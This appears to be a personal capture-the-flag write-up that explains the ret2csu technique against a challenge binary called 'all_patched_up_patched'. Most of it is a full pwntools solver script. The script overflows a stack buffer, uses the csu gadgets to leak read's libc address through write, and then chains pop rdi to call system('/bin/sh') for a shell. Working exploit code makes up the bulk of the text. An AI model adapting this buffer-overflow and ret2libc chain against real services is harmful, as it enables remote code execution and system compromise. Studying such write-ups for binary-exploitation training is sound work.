[[Pwn]]

## Ret2csu Binary Exploitation
- I'm using this technique because I thought we need to control the 3rd parameter for the total bytes to write, so naturally I need to control the `rdx` register, but the truth is we only need to control the 2nd parameter `rsi` register. But, this is still a win for me because I learned how to use ret2csu technique.
- We only have `pop rsi` gadget but not for `pop rdx` gadget, so I use ret2csu to control the `rdx` gadget.
- We need 2 csu gadget (the pop part and the mov part)
	- `r12` will become `edi`, `r13` → `rsi`, `r14` →`rdx`, `r15` will be called. We need to make sure `rbx` = 0, `rbp` = 1 so that `r15` will be called correctly, and we can pass the `add rbx, 1; cmp rbp, rbx` . By doing this, we'll pass the mov part loop immediately.
	- We need to pass 56 bytes junk to pass the pop part because after calling the second csu gadget we are going to execute the pop part again, but in this state we have successfully called our desired function, and we need to maintain the stack. There's 7 pop, so 56 bytes is enough to reach the `ret` instruction.
- The next stage is to use ret2libc to call `system(/bin/sh)` because we can calculate LIBC base address from the leaked address.


## Solver
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
	if args.GDB: # Set GDBscript below
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE: # ('server', 'port')
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else: # Run locally
		return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x40124c
b *0x40124a
b *0x4011e2
continue
'''.format(**locals())

# Binary filename
exe = './all_patched_up_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
# EXPLOIT GOES HERE
# ===========================================================

def ret2csu(rbx, rbp, r12, r13, r14, r15, ret):
	payload = flat([
		b'A' * offset,
		csu1, rbx, rbp, r12, r13, r14, r15,
		csu2,
		b'0' * 56, # JUNK to reach the return address
		ret
	])
	return payload

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc-2.31.so")
offset = 520

# Start program
io = start()

csu1 = 0x40124a # pop r12, r13, r14, r15, mov rdi, 1
csu2 = 0x401230 # rdx, rsi, edi, call [r15 + rbx*8]

# Build the payload
payload1 = ret2csu(rbx=0, rbp=1, r12=1, r13=elf.got.read, r14=8, r15=elf.got.write, ret=elf.sym['main'])

# Send the payload
io.sendlineafter(b'>', payload1)
leak = io.recvuntil(b'>')
read_leak = unpack(leak[1:-1].ljust(8, b'\x00'))
info(hex(read_leak))
libc.address = read_leak - libc.symbols['read']
info("LIBC Base: " + hex(libc.address))

# Nothing works :(
# oneshot1 = 0xe3afe # r12, r15 == NULL
# oneshot2 = 0xe3b01 # r15, rdx == NULL
# oneshot3 = 0xe3b04 # rdx, rsi == NULL
# payload2 = ret2csu(rbx=0, rbp=1, r12=0, r13=0, r14=0, r15=libc.address+oneshot3, ret=ret)

pop_rdi = libc.address + 0x23b6a
payload2 = flat({offset: [
	pop_rdi+1,
	pop_rdi,
	next(libc.search(b"/bin/sh\x00")),
	libc.sym['system']
]})

io.sendline(payload2)
io.interactive()
```
